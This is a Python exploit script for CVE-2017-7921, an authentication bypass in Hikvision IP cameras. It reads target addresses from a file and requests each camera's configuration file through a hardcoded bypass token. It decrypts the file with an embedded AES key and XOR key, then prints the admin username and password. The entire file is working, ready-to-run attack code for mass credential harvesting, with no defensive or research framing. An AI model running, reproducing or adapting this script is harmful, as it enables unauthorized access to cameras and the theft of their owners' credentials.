#!/usr/bin/python3
# @Maptnh@ CVE-2017-7921 Auto Crack password

from itertools import cycle
from Crypto.Cipher import AES
import re
import os
import sys
import requests
from requests.exceptions import RequestException

LOGO = '''                                  
            .------..------..------.
            |H.--. ||I.--. ||K.--. |
            | :/\: || (\/) || :/\: |
            | (__) || :\/: || :\/: |
            | '--'H|| '--'I|| '--'K|
            `------'`------'`------'                 
Maptnh@S-H4CK13  CVE-2017-7921 Auto Crack Hik Password
======================================================='''


class hik_dec():
    def __init__(self):
        self.URL_SUFFIX = "/System/configurationFile?auth=YWRtaW46MTEK"
    
    def add_to_16(self, s):
        while len(s) % 16 != 0:
            s += b'\0'
        return s 

    def decrypt(self, ciphertext, hex_key='279977f62f6cfd2d91cd75b889ce0c9a'):
        key = bytes.fromhex(hex_key)
        ciphertext = self.add_to_16(ciphertext)
        cipher = AES.new(key, AES.MODE_ECB)
        plaintext = cipher.decrypt(ciphertext[AES.block_size:])
        return plaintext.rstrip(b"\0")

    def xore(self, data, key=bytearray([0x73, 0x8B, 0x55, 0x44])):
        return bytes(a ^ b for a, b in zip(data, cycle(key)))

    def strings(self, file):
        chars = r"A-Za-z0-9/\-:.,_$%'()[\]<> "
        shortestReturnChar = 2
        regExp = '[%s]{%d,}' % (chars, shortestReturnChar)
        pattern = re.compile(regExp)
        return pattern.findall(file)

    def read_ips_from_file(self, file_path):
        ip_list = []
        try:
            with open(file_path, 'r', encoding='utf-8') as f:
                for line in f:
                    ip = line.strip()
                    if ip: 
                        ip_list.append(ip)
            if not ip_list:
                print(f"[!] Warning: No valid IP addresses read from {file_path}")
            return ip_list
        except FileNotFoundError:
            print(f"[!] Error: File {file_path} not found. Please verify the file path.")
            return []
        except Exception as e:
            print(f"[!] Error reading file: {str(e)}")
            return []

    def request_ip(self, ip):
        full_url = f"http://{ip}{self.URL_SUFFIX}"
        try:
            response = requests.get(full_url, timeout=10, verify=False)  
            return response
        except RequestException as e:
            print(f"Request failed for {ip}: {str(e)}")
            return None
    def find_last_list_index(self,lst, target):
        try:
            return len(lst) - 1 - lst[::-1].index(target)
        except ValueError:
            return -1

def main():
    print(LOGO)
    hik = hik_dec()
    ip_file = "./target.txt"
    ip_list = hik.read_ips_from_file(ip_file)
    if not ip_list:
        sys.exit(1)
    for ip in ip_list:  
        response = hik.request_ip(ip)
        if response is None:
            continue
        if response.status_code == 200:
            binary_data = response.content
            decrypt_data = hik.decrypt(binary_data)
            xor_data = hik.xore(decrypt_data)
            data = hik.strings(xor_data.decode('ISO-8859-1'))
            if len(data) >= 8:
                base_index = hik.find_last_list_index(data, 'admin')
                print(f"[+] http://{ip} => username:{data[base_index]} password:{data[base_index+1]}")
  

if __name__ == "__main__":
    main()